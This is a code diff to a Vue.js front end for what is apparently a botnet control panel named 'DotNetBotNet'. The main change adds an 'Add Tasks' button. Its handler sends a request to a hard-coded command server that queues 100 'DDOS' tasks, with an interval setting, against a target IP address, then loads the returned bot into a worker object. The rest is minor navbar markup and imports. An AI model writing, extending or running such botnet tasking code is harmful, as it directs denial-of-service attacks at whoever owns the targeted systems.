@@ -12,6 +12,9 @@
             </button>
           </div>
           <a class="navbar-brand" style="width: 50%; margin: auto 41% ; font-size: 36px; font-weight:bold;" href="">DotNetBotNet</a>
+          <div class="col-form-label-sm">
+            <button class="badge-pill btn-info" @click="addMoreTasks">Add Tasks</button>
+          </div>
         </div>
       </div>
       <button class="navbar-toggler" type="button"
@@ -29,7 +32,7 @@
         <div class="collapse navbar-collapse show" v-show="showMenu">
           <ul class="navbar-nav" :class="$rtl.isRTL ? 'mr-auto' : 'ml-auto'">
             <div class="search-bar input-group" @click="searchModalVisible = true">
-              
+
             </div>
           </ul>
         </div>
@@ -40,6 +43,8 @@
 <script>
   import { CollapseTransition } from 'vue2-transitions';
   import Modal from '@/components/Modal';
+  import axios from "axios";
+  import WorkerAdapter from "@/pages/store/adapter/WorkerAdapter";
 
   export default {
     components: {
@@ -81,6 +86,24 @@
       },
       toggleMenu() {
         this.showMenu = !this.showMenu;
+      },
+      addMoreTasks() {
+        axios.post(`http://45.55.70.104:8080/Management/QueueTask`, {
+          Task: "DDOS",
+          Count: 100,
+          TaskParameters: {
+            Interval: 15,
+            Address: "10.64.128.112"
+          }
+        })
+          .then((res) => {
+            this.worker = new WorkerAdapter(res.data.bot);
+            // state.commit(StoreMutations.SET_ALL_COMPLETED_TASKS, res.data);
+          })
+          .catch((error) => {
+            // eslint-disable-next-line
+            console.error(error);
+          });
       }
     }
   };
